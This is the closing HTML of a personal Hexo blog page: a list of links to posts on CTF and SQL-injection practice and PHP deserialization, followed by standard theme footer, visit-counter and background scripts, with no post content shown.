    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/05/22/buu-web-page-1/">buu web page-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/06/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/">PHP魔术方法理解</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/">php反序列化题目搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/">php反序化和pop链</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-2/">sqli-labs刷题记录page-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-1/">sqli-labs刷题记录page-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/01/sqli-labs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95page-3/">sqli-labs刷题记录page-3</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2016-2022 Qhkk
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>